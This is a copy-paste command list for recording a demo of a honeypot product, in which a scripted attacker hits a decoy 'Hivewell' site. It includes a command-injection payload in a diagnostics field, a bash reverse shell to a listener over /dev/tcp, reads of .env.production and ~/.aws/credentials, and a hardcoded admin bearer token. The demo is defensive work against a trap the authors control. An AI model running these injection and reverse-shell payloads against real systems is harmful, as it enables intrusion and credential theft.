# Demo commands (copy-paste)

Every terminal command for the demo, in order. One command per box: use the **copy button** at the top-right of each box. The spoken script for each step is in [`demo-runbook.md`](demo-runbook.md).

Terminal layout: **Pane A = listener / attacker's shell**, **Pane B = attacker's curl commands**.

---

## Before recording (services)

Run each in its own terminal tab, from the repo root. Skip any that are already running.

**Control server**
```sh
NODE_ENV=production npm run dev:control
```

**Cloudflare tunnel** (copy the `https://….trycloudflare.com` URL it prints)
```sh
cloudflared tunnel --url http://127.0.0.1:8080
```

**ngrok** (reverse-shell route)
```sh
ngrok tcp 4444
```

**Keep the laptop awake**
```sh
caffeinate -dims
```

**Show the current ngrok address** (host + port)
```sh
curl -s localhost:4040/api/tunnels | grep -o 'tcp://[^"]*'
```

**Show the ngrok host's IPs** (one of them must equal GitHub's `CALLBACK_ALLOWLIST`, currently `52.52.159.144`)
```sh
dig +short A "$(curl -s localhost:4040/api/tunnels | grep -o 'tcp://[^":]*' | sed 's#tcp://##')"
```

---

## Before recording (attacker terminal, Pane B)

**1. Set the variables.** Paste, then edit `T` to the Akash Service URI and `LPORT` to the ngrok port from above.
```sh
export T=http://PASTE-AKASH-SERVICE-URI
export TOKEN=hw_admin_5f2c9e1a7b3d4c86
export LHOST=52.52.159.144
export LPORT=15659
```

**2. Smoke test: trap is up**
```sh
curl -s $T/health
```

**3. Smoke test: it's the Hivewell site** (should print `<title>Hivewell…`, not `Acme Status`)
```sh
curl -s $T/ | grep -o '<title>[^<]*'
```

**4. Clear the screen before recording**
```sh
clear
```

---

## Recording

### Pane A: start the listener
```sh
nc -lv 4444
```
(On Linux use `nc -lvnp 4444` instead.)

### Pane B: step 1, leaked config
```sh
curl -s $T/api/env
```

### Pane B: step 2, command injection
```sh
curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" -H 'content-type: application/json' -d '{"host":"8.8.8.8; id"}'
```

### Pane B: step 3, reverse shell (it hangs; that's normal)
```sh
curl -s -X POST $T/api/admin/diagnostics -H "authorization: Bearer $TOKEN" -H 'content-type: application/json' -d "{\"host\":\"x; bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'\"}"
```

### Pane A: inside the shell, one at a time
```sh
whoami
```
```sh
cat .env.production
```
```sh
cat ~/.aws/credentials
```

Optional (answered by the Guild agent, so the dashboard shows a GUILD badge; can take 5–40 s):
```sh
find / -perm -4000 2>/dev/null
```

End the session:
```sh
exit
```

---

## Browser (not terminal)

**Hivewell status page:** open `$T/status`. Print the full URL with:
```sh
echo "$T/status"
```

**HoneyStack Shield dashboard:**
```
http://127.0.0.1:8080/admin/plugins/honeystack
```

**Dashboard login token:**
```sh
grep '^CONTROL_TOKEN=' .env | cut -d= -f2
```
